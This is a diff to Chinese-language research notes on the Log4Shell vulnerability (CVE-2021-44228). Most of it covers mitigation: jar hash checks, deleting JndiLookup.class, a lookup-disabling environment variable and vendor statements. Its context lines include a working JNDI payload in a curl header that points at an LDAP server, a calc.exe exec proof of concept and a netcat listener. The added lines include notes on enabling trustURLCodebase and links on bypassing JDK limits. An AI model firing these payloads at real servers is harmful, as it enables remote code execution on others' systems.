@@ -73,7 +73,6 @@ curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/Log4jRCE}' 'localhost:8
 172.17.0.2
 # vim Log4jRCE.java
 Runtion.getRuntime().exec("calc.exe")
-
 ```
 
 ```bash
@@ -102,6 +101,20 @@ https://amsi.fail
 
 nc -lnvp 9898 
 做为执行端
+RCE中需要打开
+System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
+
+JDK版本的默认值和JNDI注入的关系可以参考
+https://websec.readthedocs.io/zh/latest/language/java/jdk.html
+
+如何绕过高版本JDK的限制进行JNDI注入利用
+https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html
+
+https://davinsi.com/threat-advisory-apache-log4j-rce/
+Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html ) protects 
+against RCE by defaulting com.sun.jndi.rmi.object.trustURLCodebase and com.sun.jndi.cosnaming.object.trustURLCodebase to false.
+
+
 
 ### 在线测试端口
 
@@ -204,6 +217,17 @@ https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
 删除 lookup包
 https://stackoverflow.com/questions/70361367/how-to-find-vulnerable-log4j-programs-on-a-windows-10-pc-and-how-to-provide-firs/70361504
 https://discuss.elastic.co/t/delete-jndilookup-class/291507
+sha1sum log4j-core-2.14.0.jar
+echo "8dd10000eb1b768800000e1d2fe1c3100005d2dc *filename" | sha1sum -c -
+echo "e257b0562453f73eabac1bc3181ba33e79d193ed  log4j-core-2.14.0.jar" | sha1sum -c -
+openssl sha1 <file>
+
+zip -q -d log4j-core-2.14.0.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+sha1sum log4j-core-2.14.0.jar
+5de0d92e9719c1b7b92e7390e91ef46571d7102f  log4j-core-2.14.0.jar
+jar vtf log4j-core-2.14.0.jar |findstr  JndiLookup
+
+
 zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
 
 https://bmcsites.force.com/casemgmt/sc_KnowledgeArticle?sfdcid=000391450
@@ -285,8 +309,10 @@ https://itsc.nju.edu.cn/7a/42/c41947a555586/page.htm
 （3）  将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true
   TODO: 需要重启吗？还是写在bash里就可以了
 
+
 ## 厂商声明
 
+https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot
  Elasticsearch
   Elasticsearch is not susceptible to remote code execution with this vulnerability due to our use of the Java Security Manager. Elasticsearch on JDK8 or below is susceptible to an information leak via DNS which is fixed by a simple JVM property change. The information leak does not permit access to data within the Elasticsearch cluster. We will also release a new version of Elasticsearch that contains the JVM property by default and removes certain components of Log4j out of an abundance of caution. Additional details below.
   由于我们使用Java Security Manager, Elasticsearch不容易受到带有此漏洞的远程代码执行的影响。 
